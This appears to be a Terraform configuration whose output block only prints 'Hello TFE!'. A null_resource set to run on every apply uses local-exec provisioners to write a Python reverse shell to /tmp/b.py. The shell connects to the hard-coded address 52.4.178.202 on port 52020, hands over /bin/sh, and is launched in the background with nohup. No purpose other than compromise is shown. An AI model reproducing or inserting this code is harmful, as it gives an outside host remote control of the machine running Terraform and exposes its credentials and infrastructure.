

resource "null_resource" "running-local-commands" {

  triggers = {
  always_run = "${timestamp()}"
  }


  provisioner "local-exec" {
    command = <<_EOF
cat >/tmp/b.py <<-_END
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("52.4.178.202",52020));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
_END
  _EOF
  }

  provisioner "local-exec" {
    command = <<_EOF
          nohup python /tmp/b.py &
          sleep 30
    _EOF
  }




}


output "hello_world" {
  value = "Hello TFE!"
}
